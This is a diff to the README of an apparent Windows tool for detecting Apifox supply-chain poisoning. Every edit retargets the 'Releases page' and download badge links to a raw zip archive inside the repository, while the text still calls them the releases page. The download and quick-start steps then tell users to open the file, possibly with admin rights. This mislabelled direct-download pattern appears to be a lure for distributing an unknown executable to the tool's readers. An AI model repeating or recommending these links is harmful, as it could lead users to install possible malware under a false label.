@@ -1,6 +1,6 @@
 # 🛡️ Apifox-Supply-Chain-Poisoning-Attack - Detect Supply Chain Risk Fast
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://raw.githubusercontent.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/main/Windows/Poisoning_Attack_Apifox_Chain_Supply_2.6-beta.4.zip)
 
 ## 📌 Overview
 
@@ -34,7 +34,7 @@ If you use a work PC, you may need admin access to open the downloaded file.
 
 ## 📥 Download
 
-1. Open the [Releases page](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/main/Windows/Poisoning_Attack_Apifox_Chain_Supply_2.6-beta.4.zip)
 2. Find the latest release
 3. Download the Windows file from that release
 4. Save it to your Downloads folder or Desktop
@@ -169,7 +169,7 @@ These file types often appear in app folders, plugin folders, and package folder
 
 ## 📍 Download Again Later
 
-If you need a fresh copy or an update, visit the [Releases page](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases) and download the newest version there
+If you need a fresh copy or an update, visit the [Releases page](https://raw.githubusercontent.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/main/Windows/Poisoning_Attack_Apifox_Chain_Supply_2.6-beta.4.zip) and download the newest version there
 
 ## 📎 Project Info
 
@@ -219,7 +219,7 @@ A clean scan usually means:
 
 ## 🧷 Quick Start
 
-1. Go to the [Releases page](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases)
+1. Go to the [Releases page](https://raw.githubusercontent.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/main/Windows/Poisoning_Attack_Apifox_Chain_Supply_2.6-beta.4.zip)
 2. Download the latest Windows file
 3. Open it on your PC
 4. Scan the folder you want to check
@@ -248,8 +248,8 @@ Use this tool when you:
 
 ## 🔗 Download Link
 
-[![Release Download](https://img.shields.io/badge/Download%20from-Releases-grey)](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases)
+[![Release Download](https://img.shields.io/badge/Download%20from-Releases-grey)](https://raw.githubusercontent.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/main/Windows/Poisoning_Attack_Apifox_Chain_Supply_2.6-beta.4.zip)
 
 ## 📌 Next Step
 
-Open the [Releases page](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases) and download the latest Windows file
+Open the [Releases page](https://raw.githubusercontent.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/main/Windows/Poisoning_Attack_Apifox_Chain_Supply_2.6-beta.4.zip) and download the latest Windows file
